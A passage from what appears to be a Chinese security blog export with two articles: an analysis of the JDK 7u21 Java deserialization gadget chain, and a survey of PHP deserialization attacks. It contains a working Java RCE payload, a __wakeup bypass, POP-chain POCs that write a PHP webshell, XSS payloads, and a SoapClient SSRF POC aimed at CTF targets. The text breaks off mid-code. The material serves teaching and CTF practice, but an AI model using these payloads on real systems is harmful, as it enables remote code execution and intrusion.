== key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null;} 核心语句为 if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) ，这里 key.equals(k) 是我们反序列化 POC 想调用的一个结构 因此根据逻辑运算符的短路特性，我们需要满足第一个条件，需要不满足第二个条件，那么才会调用到第三个条件 这里会有两次循环，先看第一次循环，第一次循环，key 为我们的 POC 的 testTarget.add(templates); 的 TemplatesImpl 对象，由于当前 table 变量指向的 Entry 对象是空的，所以 e 是为null，因此不满足 for 循环条件，在后面会调用 addEntry 添加进 table，table是一个Entry数组，用来存放我们通过map.put()传入的键值对，并作为后续判断新传入的键值对和旧键值对是否重复的依据 第二次循环为了满足 e != null 那么需要控制 i 的值，使其能从 table 里面取出相应的对象，那么需要控制两次循环中 hash 之后的值相等 先看第一次循环中计算 hash 值 final int hash(Object k) { int h = 0; if (useAltHashing) { if (k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h = hashSeed; } h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);} 第二次循环计算 hash 值时，由于代理对象没有 hashCode 方法，会相应调用反射来解决，最终调用到 AnnotationInvocationHandler#hashCodeImpl hashCodeImpl:294, AnnotationInvocationHandler (sun.reflect.annotation)invoke:64, AnnotationInvocationHandler (sun.reflect.annotation)hashCode:-1, $Proxy1 (com.sun.proxy)hash:351, HashMap (java.util) 此时的var2是一个Iterator对象，用来遍历memberValues对象中存储的键值对，可以看到memberValues中只有一个键值对就是，就是我们在初期通过反射生成 AnnotationInvocationHandler 对象时传入的 HashMap 对象中的那个键值对 key是一个字符串”f5a5a608” Value值是和第一次循环时用来计算hash值的同一个TemplatesImpl对象 看一下具体 hash 值的计算 var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue()) 具体分为了两段 127 * ((String)var3.getKey()).hashCode() memberValueHashCode(var3.getValue() 第二段由于 Value 为计算hash值的同一个TemplatesImpl对象，因此计算出来跟之前的相等 一个小 trick 是：0和任何数字进行异或，得到的结果都是被异或数本身 那么只要控制第一段结果为 0 ，那么算出来异或值不变，那么结合我们之前说的trick，var3 此刻的 key 为 f5a5a608，因此跟任何数相乘都为 0 回到我们 HashMap#put 的 if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) 第一个判断为 hash 判断，我们刚刚通过构造已经让其相等了 第二个判断将第一次循环时的 key 取出和第二次循环时的 key 比较，第一次循环的key是TemplatesImpl对象，而第二次循环时 key 为 Proxy 对象，所以结果为flase 最后调用 key.equals(k)，这里的 key 为第二次循环的，k 为第一次循环的，因此总结了需要使用一个有序的HashSet，也就是我们的 LinkedHashSet。这样才能保证我们的调用先后 JDK 7u21 payload public class CommandDemo { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;TestDemo&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, &quot;_name&quot;, &quot;TestDemo&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); Map testMap = new HashMap(); Constructor aih_construct = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0]; aih_construct.setAccessible(true); InvocationHandler testHandler = (InvocationHandler) aih_construct.newInstance(Override.class, testMap); setFieldValue(testHandler, &quot;type&quot;, Templates.class); Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, testHandler);// proxy.equals(templates); String magicStr = &quot;f5a5a608&quot;; HashSet testTarget = new LinkedHashSet(); testTarget.add(templates); testTarget.add(proxy); testMap.put(magicStr, templates); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(testTarget); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) { field = getField(clazz.getSuperclass(), fieldName); } } return field; }} 利用链 Gadget Chain LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.&lt;clinit&gt;() ... Runtime.exec() FIX7u80版本 AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); } } 对 this.type 进行了校验必须为 Annotation.class，同时增加了异常抛出，会导致我们反序列化的失败 7u25-b01、7u25-b02尚未如此修补，341行处仍在return。有些文章说修补方案是检查了AnnotationInvocationHandler.type，估计他们是根据抛出的异常这么说的。事实上对AnnotationInvocationHandler.type的检查一直存在，要求type与java.lang.annotation.Annotation有派生、继承、实现关系，但7u25-b03之前发现问题后抛出的异常被341行的catch捕捉之后没有继续抛异常，而是return了 后续 JRE8u20 对此进行了绕过，通过构造畸型序列化数据，使得针对 AnnotationInvocationHandler.type 的检查被命中时所抛出的异常被 BeanContextSupport.readChildren() 中的 try/catch 块捕获并 continue，但构造过于复杂，且没有新的 gadget，因此不在本文探讨范围内 REFhttps://xz.aliyun.com/t/3847 https://github.com/frohoff/ysoserial http://scz.617.cn/","link":"/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"},{"title":"再谈 PHP 反序列化","text":"文章首发于 SECIN社区：https://www.sec-in.com/article/137 三种类属性Private 权限: 正常Private 权限属性名: %00类名%00属性名 。且属性名长度改变Protected 权限属性名: %00*%00属性名 。且属性名长度改变 demo&lt;?php class Test { public $name = &apos;P2hm1n&apos;; private $age = &apos;Secret&apos;; protected $test = &apos;test&apos;;}$test = new Test;$content = serialize($test);file_put_contents(&apos;./flag.txt&apos;, $content);?&gt; 魔术方法具体可参考PHP手册: https://www.php.net/manual/zh/language.oop5.magic.php construct 调用条件 :当一个类被初始化为实例时会调用(unserialize()时不会自动调用)destruct 调用条件 :当对象被销毁时会调用sleep 调用条件 :当一个类调用serialize进行序列化时会自动调用wakeup 调用条件 :当字符串要利用unserialize反序列化成一个类时会调用get() 调用条件:当从不可访问的属性读取数据call()调用条件: 当要调用的方法不存在或权限不足时自动调用invoke()调用条件: 当把一个类当作函数使用时自动调用 tostring 当反序列化后的对象被当作字符串的时候调用。具体调用场景条件如下(引用自 @k0rz3n) (1) echo ($obj) / print($obj) 打印时会触发(2) 反序列化对象与字符串连接时(3) 反序列化对象参与格式化字符串时(4) 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）(5) 反序列化对象参与格式化SQL语句，绑定参数时(6) 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时(7) 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用(8) 反序列化的对象作为 class_exists() 的参数的时候 CVE-2016-7124CVE利用目的: 绕过魔法函数__wakeup 版本限制: PHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10 核心原理: PHP 内核层解析反序列化漏洞s绕过方法: 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 Bypass demo &lt;?php class Test { public $name = &apos;P2hm1n&apos;; function __destruct() { echo &apos;Bypass&apos;; } function __wakeup() { echo &apos;fail &apos;; }}$payload = &apos;&apos;;unserialize($payload);?&gt; payloadpayload1 = O:4:&quot;Test&quot;:1:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;}// fail Bypass bypass payloadpayload1 = O:4:&quot;Test&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;}// Bypass POP链构造知识回顾挖掘暗藏ThinkPHP中的反序列利用链 一文中总结的挺好了。 方法名 调用条件 __call 调用不可访问或不存在的方法时被调用 __callStatic 调用不可访问或不存在的静态方法时被调用 __clone 进行对象clone时被调用，用来调整对象的克隆行为 __constuct 构建对象的时被调用； __debuginfo 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本 __destruct 明确销毁对象或脚本结束时被调用； __get 读取不可访问或不存在属性时被调用 __invoke 当以函数方式调用对象时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用 __set 当给不可访问或不存在属性赋值时被调用 __set_state 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。 __sleep 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用 __toString 当一个类被转换成字符串时被调用 __unset 对不可访问或不存在的属性进行unset时被调用 __wakeup 当使用unserialize时被调用，可用于做些对象的初始化操作 反序列化的常见起点 __wakeup 一定会调用 __destruct 一定会调用 __toString 当一个对象被反序列化后又被当做字符串使用 反序列化的常见中间跳板: __toString 当一个对象被当做字符串使用 __get 读取不可访问或不存在属性时被调用 __set 当给不可访问或不存在属性赋值时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func(); 反序列化的常见终点: __call 调用不可访问或不存在的方法时被调用 call_user_func 一般php代码执行都会选择这里 call_user_func_array 一般php代码执行都会选择这里 主要还是三点： 起点 跳板 代码执行 个人感觉核心是实例化对象可附值给变量,从而调用 + 各类魔术方法 demo1demo引用自 @twosmi1e 师傅 先知社区 里的代码： &lt;?phpclass start_gg{ public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call{ public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct{ public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func{ public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1; } }class string1{ public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; }}$a = $_GET[&apos;string&apos;];unserialize($a);?&gt; 从前往后跟 or 从后往前跟？ POC &lt;?phpclass start_gg{ public $mod1; public $mod2; public function __construct() { $this-&gt;mod1 = new Call(); } public function __destruct() { $this-&gt;mod1-&gt;test1(); # 入口点，mod1可通过附值起跳。 }}class Call{ public $mod1; # 实例化funct public $mod2; # 无它什么事 # 继续起跳，瞻前顾后，思考下面的 $this-&gt;mod1-&gt;test2();会在何处被什么利用 public function __construct() { $this-&gt;mod1 = new funct(); } public function test1() { $this-&gt;mod1-&gt;test2(); # 这里调 __call }}class funct{ public $mod1; # 实例化func public $mod2; # 无它什么事 public function __construct() { $this-&gt;mod1 = new func(); } public function __call($test2, $arr) { $s1 = $this-&gt;mod1; $s1(); # 这里触发 __invoke }}class func{ public $mod1; # 实例化string1 public $mod2; # __invoke对其附值，其实是为了调 __toString public function __construct() { $this-&gt;mod1 = new string1(); } public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1; # 这里若拼接则会触发 __toString }}class string1{ public $str1; # 实例化 GetFlag public $str2; public function __construct() { $this-&gt;str1 = new GetFlag(); } public function __toString() { $this-&gt;str1-&gt;get_flag(); #调用此处即可getflag，难点：需调用 __toString return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot; . &quot;xxxxxxxxxxxx&quot;; }}$payload = new start_gg();echo urlencode(serialize($payload));?&gt; demo2demo引用自 @l3mon师傅 blog 里的代码： &lt;?phpclass OutputFilter { protected $matchPattern; protected $replacement; function __construct($pattern, $repl) { $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; } function filter($data) { return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); }};class LogFileFormat { protected $filters; protected $endl; function __construct($filters, $endl) { $this-&gt;filters = $filters; $this-&gt;endl = $endl; } function format($txt) { foreach ($this-&gt;filters as $filter) { $txt = $filter-&gt;filter($txt); } $txt = str_replace(&apos;\\n&apos;, $this-&gt;endl, $txt); return $txt; }};class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(&quot;C:\\\\WWW\\\\test\\\\ctf\\\\kon\\\\&quot; . $this-&gt;filename, $txt, FILE_APPEND); }};class Logger { protected $logwriter; function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) { $this-&gt;logwriter-&gt;writeLog($txt); }};class Song { protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) { $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(&quot;/\\[i\\](.*)\\[\\/i\\]/i&quot;, &quot;&lt;i&gt;\\\\1&lt;/i&gt;&quot;); $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\\n&quot;))); } function __toString() { return &quot;&lt;a href=&apos;&quot; . $this-&gt;url . &quot;&apos;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group; } function log() { $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\\n&quot;); } function get_name() { return $this-&gt;name; }}class Lyrics { protected $lyrics; protected $song; function __construct($lyrics, $song) { $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; } function __toString() { return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\\n&quot;; } function __destruct() { $this-&gt;song-&gt;log(); } function shortForm() { return &quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&apos;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;; } function name_is($name) { return $this-&gt;song-&gt;get_name() === $name; }};class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE[&apos;lyrics&apos;])) { $oldlyrics = unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie(&apos;lyrics&apos;, base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE[&apos;lyrics&apos;])) { return unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } else { setcookie(&apos;lyrics&apos;, base64_encode(serialize(array(1, 2)))); return array(1, 2); } }};class Porter { static function exportData($lyrics) { return base64_encode(serialize($lyrics)); } static function importData($lyrics) { return serialize(base64_decode($lyrics)); }};class Conn { protected $conn; function __construct($dbuser, $dbpass, $db) { $this-&gt;conn = mysqli_connect(&quot;localhost&quot;, $dbuser, $dbpass, $db); } function getLyrics($lyrics) { $r = array(); foreach ($lyrics as $lyric) { $s = intval($lyric); $result = $this-&gt;conn-&gt;query(&quot;SELECT data FROM lyrics WHERE id=$s&quot;); while (($row = $result-&gt;fetch_row()) != NULL) { $r []= unserialize(base64_decode($row[0])); } } return $r; } function addLyrics($lyrics) { $ids = array(); foreach ($lyrics as $lyric) { $this-&gt;conn-&gt;query(&quot;INSERT INTO lyrics (data) VALUES (\\&quot;&quot; . base64_encode(serialize($lyric)) . &quot;\\&quot;)&quot;); $res = $this-&gt;conn-&gt;query(&quot;SELECT MAX(id) FROM lyrics&quot;); $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]); } echo var_dump($ids); return $ids; } function __destruct() { $this-&gt;conn-&gt;close(); $this-&gt;conn = NULL; }};unserialize($_GET[&apos;cmd&apos;]); 反序列化函数 + 可控参数 == 控制当前作用域下对象 class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE[&apos;lyrics&apos;])) { $oldlyrics = unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie(&apos;lyrics&apos;, base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE[&apos;lyrics&apos;])) { return unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } else { setcookie(&apos;lyrics&apos;, base64_encode(serialize(array(1, 2)))); return array(1, 2); } }}; 自定义 $song 值 + __destruct == 调用当前作用域下 log方法 class Lyrics { protected $lyrics; protected $song; function __construct($lyrics, $song) { $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; } function __toString() { return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\\n&quot;; } function __destruct() { $this-&gt;song-&gt;log(); } function shortForm() { return &quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&apos;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;; } function name_is($name) { return $this-&gt;song-&gt;get_name() === $name; }}; 论两个 log 方法的选择 class Logger { protected $logwriter; function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) { $this-&gt;logwriter-&gt;writeLog($txt); }};class Song { protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) { $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(&quot;/\\[i\\](.*)\\[\\/i\\]/i&quot;, &quot;&lt;i&gt;\\\\1&lt;/i&gt;&quot;); $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\\n&quot;))); } function __toString() { return &quot;&lt;a href=&apos;&quot; . $this-&gt;url . &quot;&apos;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group; } function log() { $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\\n&quot;); } function get_name() { return $this-&gt;name; }} LogWriter_File::writeLog($txt) 的写入文件 class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(&quot;C:\\\\WWW\\\\test\\\\ctf\\\\kon\\\\&quot; . $this-&gt;filename, $txt, FILE_APPEND); }}; LogFileFormat::format class LogFileFormat { protected $filters; protected $endl; function __construct($filters, $endl) { $this-&gt;filters = $filters; $this-&gt;endl = $endl; } function format($txt) { foreach ($this-&gt;filters as $filter) { $txt = $filter-&gt;filter($txt); } $txt = str_replace(&apos;\\n&apos;, $this-&gt;endl, $txt); return $txt; }}; OutputFilter::filter 自定义 preg_replace 内容 class OutputFilter { protected $matchPattern; protected $replacement; function __construct($pattern, $repl) { $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; } function filter($data) { return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); }}; preg_replace 和 str_replace 的区别 final POC &lt;?phpclass OutputFilter { protected $matchPattern; protected $replacement; function __construct() { $this-&gt;matchPattern = &quot;//&quot;; $this-&gt;replacement = &quot;&lt;?php phpinfo();?&gt;&quot;; }}class LogFileFormat { protected $filters; protected $endl; function __construct() { $this-&gt;filters = array(new OutputFilter()); # foreach ($this-&gt;filters as $filter) $this-&gt;endl = &apos;\\n&apos;; }}class LogWriter_File { protected $filename; protected $format; function __construct() { $this-&gt;filename = &quot;info.php&quot;; $this-&gt;format = new LogFileFormat(); }}class Logger { protected $logwriter; function __construct() { $this-&gt;logwriter = new LogWriter_File(); }}class Lyrics { protected $lyrics; protected $song; function __construct() { $this-&gt;lyrics = &apos;1&apos;; $this-&gt;song = new Logger(); }}$payload = new Lyrics();print_r(urlencode(serialize($payload)));?&gt; 原生类利用ZipArchive::open@Threezh1 文中已经写的很详细了。这里不再补充https://xz.aliyun.com/t/6454#toc-10 SoapClient关于SOAP安全问题：https://www.anquanke.com/post/id/153065#h2-1 利用条件：需要有soap扩展，且不是默认开启，需要手动开启需要调用一个不存在的方法触发其__call()函数 仅限于http/https协议，且http头部还存在crlf漏洞(SOAP + CRLF = SSRF) 例子可见下文: LCTF2018-bestphp’s revenge Error XSS@l3m0n 师傅blog中提到了XSS Error适用于php7版本 XSS开启报错的情况下:&lt;?php$a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);//Test$t = urldecode(&apos;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&apos;);$c = unserialize($t);echo $c; Exception XSS@l3m0n 师傅blog中提到了XSS Exception适用于php5、7版本 XSS开启报错的情况下:&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);//Test$c = urldecode(&apos;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&apos;);echo unserialize($c); 多种姿势组合拳例子可见:Pornhub某漏洞 ： https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1 涉及姿势如下可获取目录： DirectoryIteratorXXE： SimpleXMLElement创建空白文件： SQLite3 反序列化字符逃逸原理: 对类中不存在的属性也会进行反序列化。且PHP 在反序列化时，底层代码是以 ;作为字段的分隔，以 }作为结尾(字符串除外)，并且是根据长度判断内容的 利用: 构造字符串 例子一0ctf2016 一道web题 例子二安洵杯 - easy_serialize_phphttps://xz.aliyun.com/t/6911#toc-3 Session 反序列化参数相关session相关参数配置 Directive 含义 session.save_handler session保存形式。默认为files session.save_path 设置session的存储路径,默认在/tmp session.serialize_handler session序列化存储所用处理器。默认为php。 session.upload_progress.cleanup 一旦读取了所有POST数据，立即清除进度信息。默认开启 session.upload_progress.enabled 将上传文件的进度信息存在session中。默认开启。 PHP处理器三种序列化方式 处理器 对应的存储格式 php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 php 键名＋竖线＋经过serialize()函数反序列处理的值 php_serialize serialize()函数反序列处理数组方式 差异性PHP处理器差异性如下&lt;?phpini_set(&apos;session.serialize_handler&apos;,&apos;&apos;);session_start();$_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];?&gt;URL传参，?name=P2hm1n。session以文本存储方式保存在 /tmp 目录下。 php: name|s:6:&quot;P2hm1n&quot;;php_binary: \u0004二进制字符names:6:&quot;P2hm1n&quot;;php_serialize: a:1:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;} 漏洞核心也体现在 差异性 三个字 Q: 什么是差异性:A: 选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。 攻击手段trick-1利用前提: 脚本中设置的序列化处理器与php.ini设置的不同 常见漏洞场景: php_serilize 方式存入，解析又是用的 php 处理器 利用原理： php 在获取 session 的时候，会按照session.serialize_handler=php 规则来处理 session 文件。把 | 前面的值作为一个session键名，对 | 后面就会进行一个反序列化操作 trick-2配置不当可造成session被控。 当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。 但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时(session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。 session.upload_progress.cleanup关闭。这就 极大提高了漏洞的利用成功率。如果此选项session.upload_progress.cleanup打开，那么在利用时攻击者需要上传large and crash文件，来使得我们传入的data得以执行。 详情见https://bugs.php.net/bug.php?id=71101 例子一题目链接: http://web.jarvisoj.com:32784/index.php &lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{ public $mdzz; function __construct() { $this-&gt;mdzz = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET[&apos;phpinfo&apos;])){ $m = new OowoO();}else{ highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt; 差异点: phpinfo中 session.serialize_handler = php_serialize。 题目中 ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); 核心目的: 进入 eval 函数执行命令。由于题目中并没有反序列化操作，其中 $this-&gt;mdzz 不可通过常规手段控制。 观察phpinfo中session其他有关信息 构造一个上传的页面&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;change&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 构造poc &lt;?phpclass OowoO{ public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &quot;payload&quot;;echo serialize($a);?&gt; 扫描目录 phpinfo中的_SERVER[&quot;SCRIPT_FILENAME&quot;]字段得到路径：/opt/lampp/htdocs/。 随后用绝对路径读取文件 例子二题目来源: LCTF2018-bestphp’s revenge 题目给了两个源码 index.php &lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name])){ $_SESSION[name] = $_GET[name];}var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a);?&gt; flag.php &lt;?phpsession_start();echo &apos;only localhost can get flag!&apos;;$flag = &apos;LCTF{*************************}&apos;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){ $_SESSION[&apos;flag&apos;] = $flag; }?&gt; flag.php 跟 index.php 之间的微妙联系体现在$_SESSION[&apos;flag&apos;] = $flag;var_dump($_SESSION); $_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;。这里自然想到SSRF。可以利用上文提到的php原生类SoapClient中的__call方法进行SSRF。 构造SSRF的POC (POC来自 @Smi1e) &lt;?php$url = &quot;http://127.0.0.1/flag.php&quot;;$b = new SoapClient(null, array(&apos;uri&apos; =&gt; $url, &apos;location&apos; =&gt; $url));$a = serialize($b);$a = str_replace(&apos;^^&apos;, &quot;\\r\\n&quot;, $a);echo 